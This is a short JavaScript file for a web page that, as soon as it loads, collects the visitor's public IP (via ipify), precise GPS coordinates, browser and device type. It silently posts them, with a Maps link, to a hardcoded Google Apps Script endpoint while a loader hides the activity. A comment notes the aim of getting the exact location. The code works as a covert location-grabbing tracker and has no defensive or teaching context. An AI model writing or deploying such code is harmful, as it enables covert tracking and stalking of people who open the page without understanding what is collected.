// ============================================================
// CONFIGURATION
// ============================================================
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzTTKozCgUoXoiRWqZ31qOAmQeIEf90M1B7xHfdaVgZXJQzYFhwBT-s2im-Tx9J9LCH/exec";

// ============================================================
// DOM Elements
// ============================================================
const loader = document.getElementById("loader");
const toast = document.getElementById("toast");

function showToast(message, type = "success") {
    toast.textContent = message;
    toast.className = `toast ${type}`;
    setTimeout(() => toast.classList.add("hidden"), 4000);
}

function hideLoader() {
    loader.classList.add("hidden");
}

function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    return "Unknown";
}

function getDevice() {
    const ua = navigator.userAgent;
    if (/Mobi|Android/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return "Unavailable";
    }
}

// ============================================================
// GPS Location - permission puchega, exact location milega
// ============================================================
function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ lat: "Not Supported", lng: "Not Supported", status: "Not Supported" });
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                status: "Allowed"
            }),
            (err) => resolve({
                lat: "Denied",
                lng: "Denied",
                status: "Denied"
            }),
            { enableHighAccuracy: true, timeout: 15000 }
        );
    });
}

// ============================================================
// AUTO COLLECT & SEND
// ============================================================
async function collectAndSend() {
    const [ip, location] = await Promise.all([getIP(), getLocation()]);

    const mapLink = location.status === "Allowed"
        ? `https://www.google.com/maps?q=${location.lat},${location.lng}`
        : "Unavailable";

    const payload = {
        timestamp: new Date().toLocaleString(),
        latitude: location.lat,
        longitude: location.lng,
        mapLink: mapLink,
        ip: ip,
        browser: getBrowser(),
        device: getDevice(),
        status: "Location " + location.status
    };

    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (err) {}

    hideLoader();
}

collectAndSend();
